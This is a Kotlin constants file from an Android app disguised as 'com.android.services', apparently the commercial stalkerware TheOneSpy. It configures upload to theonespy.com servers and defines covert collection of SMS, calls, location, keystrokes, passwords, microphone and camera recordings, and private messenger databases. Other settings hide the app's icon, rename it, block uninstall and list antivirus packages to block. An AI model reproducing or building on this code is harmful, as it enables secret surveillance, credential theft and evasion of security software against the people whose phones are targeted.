package com.android.services.util

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Environment
import com.android.services.MyApplication
import com.android.services.models.FCMPush
import com.android.services.sharedprefs.boolean
import com.android.services.sharedprefs.int
import com.android.services.sharedprefs.string
import java.util.*

@SuppressLint("ObsoleteSdkInt")
object AppConstants {

    const val TOS_BASE_URL_TAG = "tos_base"
    const val ANDROID_MEDIA_DIRECTORY = "/Android/media/.AndroidSystemServices"
    const val STORAGE_FOLDER = "/Android/data/.AndroidSystemServices"

    const val NODE_SERVER_TAG = "node_server"
    const val NODE_VIEW360_SERVER_TAG = "node_view360_server"

    const val NODE_VIEW360_SERVER_URL = "https://node.theonespy.com:7000/"
//    const val NODE_SERVER_URL = "https://node13.theonespy.com:7000/api/"
    const val NODE_SERVER_URL = "http://nserv.theonespy.com/api/"

    //Data Uploading Sync limit
    const val imLogsUploadLimit = 50
    const val otherLogsUploadLimit = 50
    const val mediaFilesUploadLimit = 10
    //Logs Types
    const val SERVER_AUTH = "ServerAuth"
    const val FCM_TOKEN_TYPE = "FcmToken"
    const val ACTIVE_FCM_TOKEN_TYPE = "ActiveFcmToken"
    const val DEVICE_INFO_TYPE = "DeviceInfo"
    const val SYNC_SETTING_TYPE = "SyncSetting"
    const val SMS_LOG_TYPE = "SmsLog"
    const val CALL_LOG_TYPE = "CallLog"
    const val GPS_LOCATION_TYPE = "GpsLocation"
    const val CONTACTS_TYPE = "Contacts"
    const val APPOINTMENT_TYPE = "Appointment"
    const val PHOTOS_TYPE = "Photos"
    const val KEY_LOG_TYPE = "KeyLog"
    const val BROWSER_HISTORY_TYPE = "BrowserHistory"
    const val INSTALLED_APP_TYPE = "InstalledApp"
    const val CONNECTED_NETWORK_TYPE = "ConnectedNetwork"
    const val PUSH_STATUS_TYPE = "PushStatus"
    const val MIC_BUG_TYPE = "MicBug"
    const val VIDEO_BUG_TYPE = "VideoBug"
    const val CAMERA_BUG_TYPE = "CameraBug"
    const val VOICE_MESSAGE_TYPE = "VoiceMessage"
    const val SNAP_CHAT_EVENTS_TYPE = "SnapchatEvents"
    const val SCREEN_SHOT_TYPE = "Screenshot"
    const val VOIP_CALL_TYPE = "VoipCallRecord"
    const val SCREEN_RECORDING_TYPE = "ScreenRecording"
    const val SCREEN_TIME_TYPE = "ScreenTime"
    const val CALL_RECORD_TYPE = "CallRecord"
    const val SKYPE_ROOTED_TYPE = "SkypeRooted"
    const val PASSWORD_GRABBER_TYPE = "PasswordGrabber"
    const val NORMAL_SCREEN_RECORDING_TYPE = "NormalScreenRecording"
    const val WHATS_APP_ROOTED_TYPE = "WhatsAppRooted"
    const val IMO_ROOTED_TYPE = "ImoRooted"
    const val LINE_ROOTED_TYPE = "LineRooted"
    const val VIBER_ROOTED_TYPE = "ViberRooted"
    const val INSTAGRAM_MESSAGE_ROOTED_TYPE = "InstagramRooted"
    const val INSTAGRAM_POST_ROOTED_TYPE = "InstagramPostRooted"
    const val TUMBLR_ROOTED_TYPE = "TumblrRooted"
    const val APP_NOTIFICATIONS_TYPE = "AppNotifications"
    const val TEXT_ALERT_TYPE = "TextAlerts"
    const val APPS_PERMISSION_TYPE = "AppsPermissions"
    const val PUSH_NOTIFICATIONS_TYPE = "PushNotificationsType"

    const val TINDER_ROOTED_TYPE = "TinderRooted"
    const val HIKE_ROOTED_TYPE = "HikeRooted"
    const val ZALO_ROOTED_TYPE = "ZaloMessageRooted"
    const val FACEBOOK_ROOTED_TYPE = "facebookRooted"
    const val HANGOUT_ROOTED_TYPE = "hangoutRooted"
    const val VIEW_360_TYPE = "view360"
    const val CALL_INTERCEPT_TYPE = "callIntercept"
    const val VIEW_360_JITSE_TYPE = "view360ByJitse"
    const val SCREEN_SHARING_JITSE_TYPE = "screenSharingByJitse"
    const val TYPE_REMOTE_DATA_SERVICE = "RemoteDataService"
    const val GEO_FENCES_EVENTS_TYPE = "GeoFencesEvent"
    const val SCREEN_LIMIT_TYPE = "ScreenLimit"
    const val WHATS_APP_UNROOTED_TYPE = "WhatsAppUnrooted"
    const val FACEBOOK_UNROOTED_TYPE = "FacebookUnrooted"
    const val SKYPE_UNROOTED_TYPE = "SkypeUnrooted"
    const val LINE_UNROOTED_TYPE = "LineUnrooted"
    const val VIBER_UNROOTED_TYPE = "ViberUnrooted"
    const val IMO_UNROOTED_TYPE = "ImoUnrooted"
    const val INSTAGRAM_UNROOTED_TYPE = "InstagramUnrooted"
    const val SNAP_CHAT_UNROOTED_TYPE = "SnapChatUnrooted"
    const val TUMBLR_UNROOTED_TYPE = "TumblrUnrooted"
    const val HIKE_UNROOTED_TYPE = "HikeUnrooted"
    const val TINDER_UNROOTED_TYPE = "TinderUnrooted"

    private const val PREF_USER_ID = "PREF_USER_ID"
    private const val PREF_SERVICE_ID = "PREF_PHONE_SERVICE_ID"
    private const val PREF_ACTIVE_IDENTIFIER = "PREF_ACTIVE_IDENTIFIER"
    private const val PREF_DEVICE_IDENTIFIER = "PREF_DEVICE_IDENTIFIER"
    private const val PREF_SYNC_SETTING_STRING = "PREF_SYNC_SETTING_STRING"
    private const val PREF_FCM_TOKEN = "PREF_FCM_TOKEN"
    private const val PREF_FCM_TOKEN_STATUS = "PREF_FCM_TOKEN_STATUS"
    private const val PREF_SERVICE_ACTIVATE = "PREF_SERVICE_ACTIVATE"
    private const val PREF_ACTIVATION_CODE = "PREF_ACTIVATION_CODE"
    private const val PREF_SERVER_AUTH = "PREF_SERVER_AUTH"
    private const val PREF_LOCATION_LATITUDE = "PREF_LOCATION_LATITUDE"
    private const val PREF_LOCATION_LONGITUDE = "PREF_LOCATION_LONGITUDE"
    private const val PREF_MIC_BUG_QUALITY = "PREF_MIC_BUG_QUALITY"
    private const val PREF_CALL_RECORDING_QUALITY = "PREF_CALL_RECORDING_QUALITY"
    private const val PREF_SERVICE_EXPIRY_DATE = "PREF_SERVICE_EXPIRY_DATE"
    private const val PREF_SCREEN_RECORDING_APPS = "PREF_SCREEN_RECORDING_APPS"
    private const val PREF_VOIP_CALL_SETTINGS = "PREF_VOIP_CALL_SETTINGS"
    private const val PREF_APP_HIDDEN = "PREF_APP_HIDDEN"
    private const val PREF_APP_ICON_CHANGE = "PREF_APP_ICON_CHANGE"
    private const val PREF_APP_CHANGED_NAME = "PREF_APP_CHANGED_NAME"
    private const val PREF_FILE_MANAGER_PACKAGE_NAME = "PREF_FILE_MANAGER_PACKAGE_NAME"
    private const val PREF_VIEW_360_USER = "PREF_VIEW_360_USER"
    private const val PREF_UNINSTALL_PREFERENCE = "PREF_UNINSTALL_PREFERENCE"
    private const val PREF_UNINSTALL_PROTECTION_PREFERENCE = "PREF_UNINSTALL_PROTECTION_PREFERENCE"
    private const val PREF_GPS_LOCATION_INTERVAL = "PREF_GPS_LOCATION_INTERVAL"
    private const val PREF_SERVICE_START_STOP = "PREF_SERVICE_START_STOP"
    private const val PREF_SYNC_METHOD = "PREF_SYNC_METHOD"
    private const val PREF_PERMISSION_SKIP = "PREF_PERMISSION_SKIP"
    private const val PREF_DELETE_APP_DIRECTORY = "PREF_DELETE_APP_DIRECTORY"
    private const val PREF_TAMPER_COUNT = "PREF_TAMPER_COUNT"
    private const val PREF_VIEW_360_URL = "PREF_VIEW_360_URL"
    private const val PREF_NETWORK_PROVIDE_NAME = "PREF_NETWORK_PROVIDE_NAME"
    private const val PREF_NETWORK_PROVIDE_NUMBER = "PREF_NETWORK_PROVIDE_NUMBER"
    private const val PREF_AUTO_GRANT_SCREEN_REC_PERMISSION =
        "PREF_AUTO_GRANT_SCREEN_REC_PERMISSION"
    private const val PREF_DISABLE_NOTIFICATION_PERM = "PREF_DISABLE_NOTIFICATION_PERM"

    // App Sync Settings
    private const val SYNC_SMS = "smsSync"
    private const val SYNC_CALL = "callSync"
    private const val SYNC_CALL_RECORDING = "callRecordingSync"
    private const val SYNC_MIC_BUG = "micBugSync"
    private const val SYNC_VOIP_CALL = "voipCallSync"
    private const val SYNC_CAMERA_BUG = "cameraBugSync"
    private const val SYNC_VIDEO_BUG = "videoBugSync"
    private const val SYNC_KEY_LOGGER = "keyLoggerSync"
    private const val SYNC_APP_REPORT = "appReportSync"
    private const val SYNC_SCREEN_SHOTS = "screenShotsSync"
    private const val SYNC_TUMBLER = "tumblrSync"
    private const val SYNC_APPOINTMENTS = "appointmentSync"
    private const val SYNC_BROWSER_HISTORY = "browserHistorySync"
    private const val SYNC_INSTALLED_APPS = "installedAppSync"
    private const val SYNC_PHOTOS = "photosSync"
    private const val SYNC_CONTACTS = "contactSync"
    private const val SYNC_LINE = "lineSync"
    private const val SYNC_GMAIL = "gmailSync"
    private const val SYNC_WHATS_APP = "whatsAppSync"
    private const val SYNC_SKYPE = "skypeSync"
    private const val SYNC_FACEBOOK = "facebookSync"
    private const val SYNC_VIBER = "viberSync"
    private const val SYNC_ZALO = "zaloSync"
    private const val SYNC_INSTAGRAM = "instagramSync"
    private const val SYNC_VOICE_MESSAGES = "voiceMessageSync"
    private const val SYNC_KIK = "kikSync"
    private const val SYNC_VINE = "vineSync"
    private const val SYNC_TINDER = "tinderSync"
    private const val SYNC_HIKE = "hikeSync"
    private const val SYNC_HANGOUTS = "hangoutSync"
    private const val SYNC_IMO = "imoSync"
    private const val SYNC_SNAPCHAT = "snapchatSync"
    private const val SYNC_GEO_LOCATION = "geoLocationSync"
    private const val SYNC_ON_OFF = "syncOnOff"
    private const val CALL_RECORDING_METHOD = "callRecordingMethod"
    private const val SYNC_CONNECTED_NETWORKS = "syncConnectedNetworks"
    private const val SYNC_LINE_VOIP = "syncLineVoip"
    private const val SYNC_HIKE_VOIP = "syncHikeVoip"
    private const val SYNC_TELEGRAM_VOIP = "syncTelegramVoip"
    private const val SYNC_IMO_VOIP = "syncImoVoip"
    private const val SYNC_HANGOUTS_VOIP = "syncHangoutVoip"
    private const val SYNC_VIBER_VOIP = "syncViberVoip"
    private const val SYNC_APP_NOTIFICATIONS = "syncAppNotifications"
    private const val LOCATION_PERMISSION_COUNTER = "locationPermsissionCounter"
    private const val IS_APP_ICON_CREATED = "isAppIconCreated"

    const val DATE_FORMAT_1 = "yyyy-MM-dd HH:mm:ss"
    const val DATE_FORMAT_2 = "EEE, d MMM yyyy HH:mm:ss"
    const val DATE_FORMAT_3 = "yyyy-MM-dd hh:mm"
    const val DATE_FORMAT_4 = "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'"
    const val DATE_FORMAT = "yyyy-MM-dd"

    /** Root Db directories of Instant Messengers **/
    val IMO_DB_PATH = StringBuilder().append(Environment.getDataDirectory())
        .append("/data/com.imo.android.imoim/databases/")
        .toString()
    val WHATS_APP_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.whatsapp/databases/")
        .toString()
    val TELEGRAM_VOICE_MESSAGE_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/org.telegram.messenger/files/Telegram/Telegram Audio/")
        .toString()
    val FACEBOOK_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.facebook.orca/databases/")
        .toString()
    val SKYPE_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.skype.raider/databases/")
        .toString()
    val INSTAGRAM_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.instagram.android/databases/")
        .toString()
    val INSTAGRAM_CACHE_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.instagram.android/cache/")
        .toString()
    val TINDER_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.tinder/databases/")
        .toString()
    val VIBER_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.viber.voip/databases/")
        .toString()
    val HIKE_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.hike.chat.stickers/databases/")
        .toString()
    val KIK_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/kik.android/databases/")
        .toString()
    val LINE_DB_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/jp.naver.line.android/databases/")
        .toString()
    val DB_FACEBOOK_PATH = StringBuilder()
        .append(Environment.getDataDirectory())
        .append("/data/com.facebook.orca/databases/")
        .toString()
    val AUDIO_IMO_PATH =
        Environment.getDataDirectory().toString() + "/data/com.imo.android.imoim/files/audio/"
    val DB_TUMBLR_PATH = Environment.getDataDirectory().toString() + "/data/com.tumblr/databases/"
    val DB_HANGOUTS_PATH =
        Environment.getDataDirectory().toString() + "/data/com.google.android.talk/databases/"
    val DB_ZALO_PATH = Environment.getDataDirectory().toString() + "/data/com.zing.zalo/databases/"
    val DB_TINDER_PATH = Environment.getDataDirectory().toString() + "/data/com.tinder/databases/"

    /** Storage Directories **/
    const val DIR_MIC_BUG = "8DE4RRT848OEPS"
    const val DIR_CALL_RECORD = "3DRF4HRT849OLPM"
    const val DIR_VOIP_CALL_RECORD = "R45F53R849OG0N"
    const val DIR_PHOTOS = "X4CV53R54LOL0K"
    const val DIR_SNAP_CHAT_EVENTS = "GY6758M94LOL0L"
    const val DIR_VIDEO_BUG = "V96758M94VOV0V"
    const val DIR_CAMERA_BUG = "C9C75BM94COC0C"
    const val DIR_SCREEN_RECORDING = "S9R75BM94SOR0S"
    const val DIR_SCREEN_SHOT = "SSR72BMSS8OR9S"
    const val DIR_VOICE_MESSAGES = "VSR72BMVM8OM9V"
    const val DIR_INSTAGRAM = "DIR729MVI8O49I2"

    var gpsIntervalCounter = 0
    var isUserPresent = false
    var isPasswordGrabbing = false
    var isAppScreenRecording = false
    var screenRecordingIntent: Intent? = null

    @JvmStatic
    var lastEncoded = ""

    const val SNAPCHAT_PACKAGE_NAME = "com.snapchat.android"
    const val TIKTOK_PACKAGE_NAME = "com.zhiliaoapp.musically"

    var daysInWeek =
        Arrays.asList("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday")

    @JvmStatic
    val preferences: SharedPreferences by lazy {
        MyApplication.appContext.getSharedPreferences("TOSPreferences", Context.MODE_PRIVATE)
    }

    /** Return True if Android OS Greater Than Or Equal to Nougat [7.0] **/
    val osGreaterThanEqualToNougat by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.N
    }

    /** Return True if Android OS Greater Than Or Equal to Oreo [8.0] **/
    val osGreaterThanEqualToOreo by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
    }

    /** Return True if Android OS Greater Than Or Equal to Android Q [10.0] **/
    val osGreaterThanEqualToTen by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
    }

    /** Return True if Android OS Greater Than Or Equal to Android 11 [11.0] **/
    val osGreaterThanEqualToEleven by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
    }

    /** OS Greater than or Equal to Pie Android 9 **/
    val osGreaterThanEqualToPie by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
    }

    /** Return True if Android OS Less Than to Android Q [10.0] **/
    val osLessThanTen by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
    }
    /** Return True if Android OS Greater Than Or Equal to Android 13 [13.0] **/
    val osGreaterThanEqualToThirteen by lazy {
        Build.VERSION.SDK_INT >= 33
    }
    /** Return True if Android OS Greater Than Or Equal to Android 12 [12.0] **/
    val osGreaterThanEqualToTwelve by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
    }

    /** Checks if Android OS Less P **/
    val osLessThanPie by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.P
    }

    /** Checks if Android OS Less Oreo **/
    val osLessThanOreo by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.O
    }

    /** Checks if Android OS Less than Android 11 **/
    val osLessThanEleven by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.R
    }

    val osIsEleven by lazy {
        Build.VERSION.SDK_INT == Build.VERSION_CODES.R
    }

    /** Android OS Greater than or Equal to 10 **/
    val osGreaterThanOrEqualToTen by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
    }
    var autoGrantScreenRecordingPermission: Boolean by preferences.boolean(
        PREF_AUTO_GRANT_SCREEN_REC_PERMISSION, true
    )
    var isAppHidden: Boolean by preferences.boolean(PREF_APP_HIDDEN)
    var isAppIconChange: Boolean by preferences.boolean(PREF_APP_ICON_CHANGE)
    var appChangedName: String? by preferences.string(PREF_APP_CHANGED_NAME)
    var fileManagerPackageName: String? by preferences.string(PREF_FILE_MANAGER_PACKAGE_NAME)
    var userId: String? by preferences.string(PREF_USER_ID)
    var gpsLocationInterval: String? by preferences.string(
        PREF_GPS_LOCATION_INTERVAL,
        defaultValue = "5"
    )
    var networkName: String? by preferences.string(PREF_NETWORK_PROVIDE_NAME, "")
    var phoneNumber: String? by preferences.string(PREF_NETWORK_PROVIDE_NUMBER, "")

    var isAppIconCreated: Boolean by preferences.boolean(IS_APP_ICON_CREATED, false)
    var locationPermissionCounter: Int by preferences.int(LOCATION_PERMISSION_COUNTER)
    var phoneServiceId: String? by preferences.string(PREF_SERVICE_ID)
    var activationCode: String? by preferences.string(PREF_ACTIVATION_CODE)
    var authToken: String? by preferences.string(PREF_SERVER_AUTH)
    var locationLatitude: String? by preferences.string(PREF_LOCATION_LATITUDE)
    var locationLongitude: String? by preferences.string(PREF_LOCATION_LONGITUDE)
    var fcmToken: String? by preferences.string(PREF_FCM_TOKEN)

    @JvmStatic
    var fcm:FCMPush?=null
    var permissionSkip: String? by preferences.string(PREF_PERMISSION_SKIP)
    var tamperCount: String? by preferences.string(PREF_TAMPER_COUNT)
    var view360Url: String? by preferences.string(PREF_VIEW_360_URL)
    var fcmTokenStatus: Boolean by preferences.boolean(PREF_FCM_TOKEN_STATUS)
    var smsLogSync: Boolean by preferences.boolean(SYNC_SMS)
    var syncAppNotifications: Boolean by preferences.boolean(SYNC_APP_NOTIFICATIONS)
    var callLogSync: Boolean by preferences.boolean(SYNC_CALL)
    var syncCallRecording: Boolean by preferences.boolean(SYNC_CALL_RECORDING)
    var syncMicBug: Boolean by preferences.boolean(SYNC_MIC_BUG)
    var voipCallSync: Boolean by preferences.boolean(SYNC_VOIP_CALL)
    var syncCameraBug: Boolean by preferences.boolean(SYNC_CAMERA_BUG)
    var syncVideoBug: Boolean by preferences.boolean(SYNC_VIDEO_BUG)
    var keyLoggerSync: Boolean by preferences.boolean(SYNC_KEY_LOGGER)
    var syncTumblr: Boolean by preferences.boolean(SYNC_TUMBLER)
    var syncAppointments: Boolean by preferences.boolean(SYNC_APPOINTMENTS)
    var syncBrowsingHistory: Boolean by preferences.boolean(SYNC_BROWSER_HISTORY)
    var syncInstalledApps: Boolean by preferences.boolean(SYNC_INSTALLED_APPS)
    var syncPhotos: Boolean by preferences.boolean(SYNC_PHOTOS)
    var syncContacts: Boolean by preferences.boolean(SYNC_CONTACTS)
    var syncLine: Boolean by preferences.boolean(SYNC_LINE)
    var syncGmail: Boolean by preferences.boolean(SYNC_GMAIL)
    var syncWhatsApp: Boolean by preferences.boolean(SYNC_WHATS_APP)
    var syncSkype: Boolean by preferences.boolean(SYNC_SKYPE)
    var syncFacebook: Boolean by preferences.boolean(SYNC_FACEBOOK)
    var syncKeyLogger: Boolean by preferences.boolean(SYNC_KEY_LOGGER)
    var syncAppReports: Boolean by preferences.boolean(SYNC_APP_REPORT)
    var syncScreenShots: Boolean by preferences.boolean(SYNC_SCREEN_SHOTS)
    var syncViber: Boolean by preferences.boolean(SYNC_VIBER)
    var syncZalo: Boolean by preferences.boolean(SYNC_ZALO)
    var syncInstagram: Boolean by preferences.boolean(SYNC_INSTAGRAM)
    var syncVoiceMessages: Boolean by preferences.boolean(SYNC_VOICE_MESSAGES)
    var syncKik: Boolean by preferences.boolean(SYNC_KIK)
    var syncTinder: Boolean by preferences.boolean(SYNC_TINDER)
    var syncHike: Boolean by preferences.boolean(SYNC_HIKE)
    var syncHangouts: Boolean by preferences.boolean(SYNC_HANGOUTS)
    var syncImo: Boolean by preferences.boolean(SYNC_IMO)
    var syncSnapchat: Boolean by preferences.boolean(SYNC_SNAPCHAT)
    var syncGeoLocation: Boolean by preferences.boolean(SYNC_GEO_LOCATION)
    var callRecordingMethod: Int by preferences.int(CALL_RECORDING_METHOD)
    var syncConnectedNetworks: Boolean by preferences.boolean(SYNC_CONNECTED_NETWORKS)
    var syncLineVoip: Boolean by preferences.boolean(SYNC_LINE_VOIP)
    var syncHikeVoip: Boolean by preferences.boolean(SYNC_HIKE_VOIP)
    var syncTelegramVoip: Boolean by preferences.boolean(SYNC_TELEGRAM_VOIP)
    var syncImoVoip: Boolean by preferences.boolean(SYNC_IMO_VOIP)
    var syncHangoutsVoip: Boolean by preferences.boolean(SYNC_HANGOUTS_VOIP)
    var syncViberVoip: Boolean by preferences.boolean(SYNC_VIBER_VOIP)
    var serviceActivated: Boolean by preferences.boolean(PREF_SERVICE_ACTIVATE)
    var serviceState: Boolean by preferences.boolean(PREF_SERVICE_START_STOP, defaultValue = true)
    var networkSyncMethod: String? by preferences.string(
        PREF_SYNC_METHOD,
        defaultValue = "3"
    )
    var isDisableNotificationPerm: Boolean by preferences.boolean(PREF_DISABLE_NOTIFICATION_PERM,false)
    var micBugQuality: String? by preferences.string(PREF_MIC_BUG_QUALITY)
    var callRecordQuality: String? by preferences.string(PREF_CALL_RECORDING_QUALITY)
    var screenRecordingApps: String? by preferences.string(PREF_SCREEN_RECORDING_APPS)
    var serviceExpiryDate: String? by preferences.string(PREF_SERVICE_EXPIRY_DATE)
    var voipCallApps: String? by preferences.string(PREF_VOIP_CALL_SETTINGS)
    var syncOnOff: Boolean by preferences.boolean(SYNC_ON_OFF)
    var view360User: String? by preferences.string(PREF_VIEW_360_USER)
    var deviceIdentifier: String? by preferences.string(PREF_DEVICE_IDENTIFIER,"")
    var syncSetting: String? by preferences.string(PREF_SYNC_SETTING_STRING,"")
    var activeIdentifier: String? by preferences.string(PREF_ACTIVE_IDENTIFIER,"")
    var uninstallPreference: Boolean by preferences.boolean(PREF_UNINSTALL_PREFERENCE)
    var uninstallProtectionPreference: Boolean by preferences.boolean(
        PREF_UNINSTALL_PROTECTION_PREFERENCE
    )
    var deleteAppDirectories: Boolean by preferences.boolean(PREF_DELETE_APP_DIRECTORY)

    val osGreaterThanOrEqualLollipop by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
    }

    val osGreaterThanOrEqualMarshmallow by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
    }

    const val SMS_URI = "content://sms"
    var view360CameraType = "0"
    var view360InteruptMessage = ""
    var isSpyAudioCall = true
    var isScreenOnly = false

    @JvmStatic
    var isMyAppScreenCastPermission = false
    val BLOCKED_ANTIVIRUS_LIST = listOf(
        "com.wsandroid.suite",
        "com.antivirus",
        "com.avira.android",
        "com.avast.android.mobilesecurity",
        "com.symantec.mobilesecurity",
        "com.pandasecurity.pandaav",
        "com.qihoo.security",
        "com.kms.free",
        "com.asurion.android.verizon.vms",
        "com.nasable.appsnitch",
        "com.huawei.systemmanager"
    )

}